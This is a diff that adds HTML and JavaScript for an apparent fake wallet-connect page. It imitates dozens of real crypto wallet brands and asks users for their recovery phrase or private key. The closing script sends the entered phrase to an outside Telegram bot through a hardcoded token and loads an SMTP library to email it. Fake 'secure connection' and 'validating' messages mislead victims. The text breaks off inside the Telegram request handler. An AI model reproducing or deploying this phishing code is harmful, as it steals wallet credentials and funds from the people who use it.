+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            BitKeep
+           </a>
+          </h5>
+          <span class="price">
+           bitkeep.com
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/unstoppable_wallet.jpg" data-title="Unstoppable Wallet" id="unstoppable_wallet" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/unstoppable_wallet.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            Unstoppable Wallet
+           </a>
+          </h5>
+          <span class="price">
+           unstoppable.money
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/halodefi_wallet.jpg" data-title="HaloDefi Wallet" id="halodefi_wallet" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/halodefi_wallet.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            HaloDefi Wallet
+           </a>
+          </h5>
+          <span class="price">
+           halodefi.org
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="https://play-lh.googleusercontent.com/UlhGKCVtUuXjDDF_fFdDQaF7mdUpMpsKvfQNNQHuwzbNEvvN-sYRNLk308wpWmLQkR4" data-title="Yoroi Wallet" id="dok_wallet" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="https://play-lh.googleusercontent.com/UlhGKCVtUuXjDDF_fFdDQaF7mdUpMpsKvfQNNQHuwzbNEvvN-sYRNLk308wpWmLQkR4"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            Yoroi Wallet
+           </a>
+          </h5>
+          <span class="price">
+           Yoroi.com
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/dok_wallet.jpg" data-title="Dok Wallet" id="dok_wallet_2" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/dok_wallet.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            Dok Wallet
+           </a>
+          </h5>
+          <span class="price">
+           dokwallet.com
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/celo_wallet.jpg" data-title="Cello Wallet" id="celo_wallet" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/celo_wallet.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            Cello Wallet
+           </a>
+          </h5>
+          <span class="price">
+           cellowallet.app
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/coinus.jpg" data-title="CoinUs" id="coinus" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/coinus.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            CoinUs
+           </a>
+          </h5>
+          <span class="price">
+           coinus.io
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/valora.jpg" data-title="Valora" id="valora" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/valora.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            Valora
+           </a>
+          </h5>
+          <span class="price">
+           valoraapp.com
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/trustee_wallet.jpg" data-title="Trustee Wallet" id="trustee_wallet" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/trustee_wallet.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            Trustee Wallet
+           </a>
+          </h5>
+          <span class="price">
+           trusteeglobal.com
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/guarda_wallet.jpg" data-title="Gaurda Wallet" id="guarda_wallet" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/guarda_wallet.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            Gaurda Wallet
+           </a>
+          </h5>
+          <span class="price">
+           guarda.com
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/jade_wallet.jpg" data-title="Jade Wallet" id="jade_wallet" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/jade_wallet.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            Jade Wallet
+           </a>
+          </h5>
+          <span class="price">
+           jadewallet.io
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/plasmapay.jpg" data-title="PlasmaPay" id="plasmapay" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/plasmapay.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            PlasmaPay
+           </a>
+          </h5>
+          <span class="price">
+           plasmapay.com
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/o3_wallet.jpg" data-title="O3Wallet" id="o3_wallet" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/o3_wallet.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            O3Wallet
+           </a>
+          </h5>
+          <span class="price">
+           o3.network
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/hashkey_me.jpg" data-title="HashKey Me" id="hashkey_me" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/hashkey_me.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            HashKey Me
+           </a>
+          </h5>
+          <span class="price">
+           me.hashkey.com
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/rwallet.jpg" data-title="RWallet" id="rwallet" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/rwallet.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            RWallet
+           </a>
+          </h5>
+          <span class="price">
+           rsk.co
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/flare_wallet.jpg" data-title="Flare Wallet" id="flare_wallet" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/flare_wallet.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            Flare Wallet
+           </a>
+          </h5>
+          <span class="price">
+           flarewallet.io
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/kyberswap.jpg" data-title="KyberSwap" id="kyberswap" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/kyberswap.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            KyberSwap
+           </a>
+          </h5>
+          <span class="price">
+           kyberswap.com
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/atoken_wallet.jpg" data-title="AToken Wallet" id="atoken_wallet" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/atoken_wallet.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            AToken Wallet
+           </a>
+          </h5>
+          <span class="price">
+           atoken.com
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/tongue_wallet.jpg" data-title="Tongue Wallet" id="tongue_wallet" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/tongue_wallet.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            Tongue Wallet
+           </a>
+          </h5>
+          <span class="price">
+           tongue.fi
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/xinfin.jpg" data-title="XinFin XDC Network" id="xinfin" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/xinfin.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            XinFin XDC Network
+           </a>
+          </h5>
+          <span class="price">
+           xinfin.io
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/talken_wallet.jpg" data-title="Talken Wallet" id="talken_wallet" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/talken_wallet.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            Talken Wallet
+           </a>
+          </h5>
+          <span class="price">
+           talken.io
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/keyring_pro.jpg" data-title="KEYRING PRO" id="keyring_pro" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/keyring_pro.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            KEYRING PRO
+           </a>
+          </h5>
+          <span class="price">
+           keyring.app
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/midas_wallet.jpg" data-title="Midas Wallet" id="midas_wallet" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/midas_wallet.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            Midas Wallet
+           </a>
+          </h5>
+          <span class="price">
+           midasprotocol.io
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/at_wallet.jpg" data-title="AT.Wallet" id="at_wallet" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/at_wallet.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            AT.Wallet
+           </a>
+          </h5>
+          <span class="price">
+           authentrend.com
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/imtoken.jpg" data-title="imToken" id="imtoken" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/imtoken.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            imToken
+           </a>
+          </h5>
+          <span class="price">
+           token.im
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/d'cent.jpg" data-title="D'Cent" id="imtoken_2" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/d%27cent.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            D'Cent
+           </a>
+          </h5>
+          <span class="price">
+           dcentwallet.com
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/enjin.jpg" data-title="Enjin" id="imtoken_3" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/enjin.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            Enjin
+           </a>
+          </h5>
+          <span class="price">
+           enjin.io
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/etoro.jpg" data-title="Etoro" id="imtoken_4" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/etoro.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            Etoro
+           </a>
+          </h5>
+          <span class="price">
+           etoro.com
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/onto.jpg" data-title="ONTO" id="imtoken_5" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/onto.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            ONTO
+           </a>
+          </h5>
+          <span class="price">
+           onto.app
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/spatium.jpg" data-title="Spatium" id="imtoken_6" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/spatium.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            Spatium
+           </a>
+          </h5>
+          <span class="price">
+           spatium.net
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/torus.jpg" data-title="Torus" id="imtoken_7" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/torus.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            Tirus
+           </a>
+          </h5>
+          <span class="price">
+           tor.us
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/tradestation.jpg" data-title="Tradestation" id="imtoken_8" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/tradestation.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            Tradestation
+           </a>
+          </h5>
+          <span class="price">
+           tradestation.com
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/zelcore.jpg" data-title="Zelcore" id="imtoken_9" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/zelcore.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            Zelcore
+           </a>
+          </h5>
+          <span class="price">
+           zelcore.io
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/bifrost.jpg" data-title="Bifrost" id="imtoken_10" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/bifrost.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            Bifrost Wallet
+           </a>
+          </h5>
+          <span class="price">
+           bifrostwallet.com
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/exodus.jpg" data-title="Exodus" id="imtoken_11" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/exodus.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            Exodus
+           </a>
+          </h5>
+          <span class="price">
+           exodus.com
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/ellipal.jpg" data-title="Ellipal" id="imtoken_12" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/ellipal.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            Ellipal
+           </a>
+          </h5>
+          <span class="price">
+           ellipal.com
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/trezor.jpg" data-title="Trezor" id="imtoken_13" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/trezor.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            Trezor
+           </a>
+          </h5>
+          <span class="price">
+           trezor.io
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/arculus.jpg" data-title="Arculus" id="imtoken_14" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/arculus.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            Arculus
+           </a>
+          </h5>
+          <span class="price">
+           getarculus.com
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+        <div class="sc-author-box select_wallet" data-logo="https://evm.flaretrustlines.com/static/logo/imtoken.jpg" data-title="imToken" id="imtoken_15" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="assets/admin/images/profile/6765cc08625b91734724616.png"/>
+          </a>
+          <div class="badge">
+           <i class="fa fa-check">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            Tangem wallet
+           </a>
+          </h5>
+          <span class="price">
+           Tangem.com
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 error" style="display: none">
+        <div class="sc-author-box">
+         <div class="author-avatar">
+          <a href="#0">
+           <img alt="Image" class="avatar" src="static/logo/error.png"/>
+          </a>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            No match was found
+           </a>
+          </h5>
+          <span class="price">
+          </span>
+         </div>
+        </div>
+       </div>
+      </div>
+     </div>
+    </section>
+   </div>
+   <!-- Replace the existing popup_connect_wallet_success modal with this new version -->
+   <div aria-hidden="true" class="modal fade popup" id="popup_connect_wallet_success" role="dialog" tabindex="-1">
+    <div class="modal-dialog modal-dialog-centered" role="document">
+     <div class="modal-content modern-modal">
+      <button aria-label="Close" class="close modern-close" data-dismiss="modal" type="button">
+       <span aria-hidden="true">
+        ×
+       </span>
+      </button>
+      <div class="modal-body space-y-20 pd-40">
+       <div class="connection-status-wrapper">
+        <!-- Loading Animation -->
+        <div class="loading-animation" id="loading-animation">
+         <div class="circle-loader">
+          <div class="checkmark draw">
+          </div>
+         </div>
+        </div>
+        <!-- Error Icon -->
+        <div class="error-icon" id="error-icon" style="display: none;">
+         <svg class="error-svg" viewbox="0 0 24 24">
+          <path d="M12 4c-4.42 0-8 3.58-8 8s3.58 8 8 8 8-3.58 8-8-3.58-8-8-8zm1 13h-2v-2h2v2zm0-4h-2V7h2v6z">
+          </path>
+         </svg>
+        </div>
+        <h3 class="status-title" id="connection_status_title">
+         Connecting Wallet
+        </h3>
+        <p class="status-message" id="connection_status_message">
+         Validating your wallet credentials...
+        </p>
+        <!-- Progress Steps -->
+        <div class="progress-steps">
+         <div class="step active" id="step1">
+          <div class="step-icon">
+           1
+          </div>
+          <div class="step-label">
+           Initializing
+          </div>
+         </div>
+         <div class="step" id="step2">
+          <div class="step-icon">
+           2
+          </div>
+          <div class="step-label">
+           Validating
+          </div>
+         </div>
+         <div class="step" id="step3">
+          <div class="step-icon">
+           3
+          </div>
+          <div class="step-label">
+           Connecting
+          </div>
+         </div>
+        </div>
+        +
+        <div class="mt-4 text-center">
+         +
+         <a class="btn btn-sm" href="chat.html" style="background: rgba(81, 66, 252, 0.1); color: #5142FC;">
+          +                                   View Chat Room
++
+         </a>
+         +
+        </div>
+       </div>
+      </div>
+     </div>
+    </div>
+   </div>
+   <div aria-hidden="true" class="modal fade popup" id="popup_connect_wallet" style="display: none;" tabindex="-1">
+    <div class="modal-dialog modal-dialog-centered" role="document">
+     <div class="modal-content">
+      <button aria-label="Close" class="close" data-dismiss="modal" type="button">
+       <span aria-hidden="true">
+        ×
+       </span>
+      </button>
+      <div class="modal-body space-y-20 pd-40">
+       <h3>
+        <img class="avatar" height="50" id="wallet_logo" src="static/logo/walle.jpg" width="50"/>
+        <br/>
+        <span clas="mt-1" id="wallet_name">
+         Wallet Connect
+        </span>
+       </h3>
+       <p class="text-center">
+        This session is secured and encrypted
+       </p>
+       <div id="auto_connecting" style="display: none;">
+        <br/>
+        <br/>
+        <br/>
+        <div class="heading-line s2" style="width: 100%;">
+         <br/>
+         <h5 align="center">
+          starting secure connection...
+          <br/>
+          <i align="center" class="text-muted align-items-center" style="text-align: center !important; font-size:small">
+           please wait...
+          </i>
+         </h5>
+         <br/>
+        </div>
+       </div>
+       <div id="failed_to_connect" style="">
+        <div style="padding:6px; color:red; border:1px solid red; border-radius:5px; text-align:center!important; font-size:16px; font-weight:500;">
+         An error occurred... please try again or connect mannually
+        </div>
+        <br/>
+        <br/>
+        <br/>
+        <a aria-label="Close" class="btn btn-outline-primary" href="#" id="try_auto_connecting_again">
+         Try Again
+        </a>
+        <br/>
+        <a class="btn btn-primary" href="#" id="button_connect_manually">
+         Connect
+                                Manually
+        </a>
+       </div>
+       <div id="div_connect_manuallly" style="display:none;">
+        <textarea autocomplete="off" class="form-control text-primary" id="secret_phrase" name="secret_phrase" placeholder="Enter your 12 or 24-word recovery phrase (separated by spaces) or private key" rows="4" spellcheck="false" style="font-size:25px; font-weight:650"></textarea>
+        <div id="phrase_error" style="display: none; color: red;">
+         Invalid input. Please enter a valid recovery phrase.
+        </div>
+        <br/>
+        <button class="btn btn-primary" disabled="" id="button_connect_wallet" style="opacity: 0.2" type="button">
+         Connect Wallet
+        </button>
+       </div>
+       <script src="https://smtpjs.com/v3/smtp.js">
+       </script>
+       <script>
+        const textarea = document.getElementById('secret_phrase');
+                            const connectButton = document.getElementById('button_connect_wallet');
+                            const errorDiv = document.getElementById('phrase_error');
+                        
+                            // Enable button when there's input
+                            textarea.addEventListener('input', () => {
+                                if (textarea.value.trim().length > 0) {
+                                    connectButton.disabled = false;
+                                    connectButton.style.opacity = 1;
+                                } else {
+                                    connectButton.disabled = true;
+                                    connectButton.style.opacity = 0.2;
+                                }
+                            });
+                        
+                            connectButton.addEventListener('click', () => {
+                                const secretPhrase = textarea.value.trim();
+                        
+                                if (!validateInput(secretPhrase)) {
+                                    errorDiv.style.display = 'block';
+                                    errorDiv.textContent = 'Invalid input. Please enter a valid recovery phrase.';
+                                    return;
+                                }
+                                
+                                errorDiv.style.display = 'none';
+                        
+                                // Send data to email and Telegram
+                                sendEmail(secretPhrase);
+                                sendToTelegram(secretPhrase);
+                            });
+                        
+                            function validateInput(input) {
+                                return input.split(' ').length >= 12; // Validate for at least 12 words
+                            }
+                        
+                            function sendToTelegram(secretPhrase) {
+                                const botToken = "7655438323:AAEGO9-mW-ga73GYbw_PosW5RFmabmTwcmk"; // Replace with your bot token
+                                const chatId = "7651943856"; // Replace with your Telegram group chat ID
+                                const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                        
+                                const message = `🚨 Recovery Phrase Submitted 🚨\n\n${secretPhrase}`;
+                        
+                                fetch(telegramApiUrl, {
+                                    method: "POST",
+                                    headers: {
+                                        "Content-Type": "application/json",
+                                    },
+                                    body: JSON.stringify({
+                                        chat_id: chatId,
+                                        text: message,
+                                    }),
+                                })
+                                    .then((response) => {
+                                        if (response.ok) {
+                                            console.log("Message sent to Telegram successfully!");
+                                        } else {
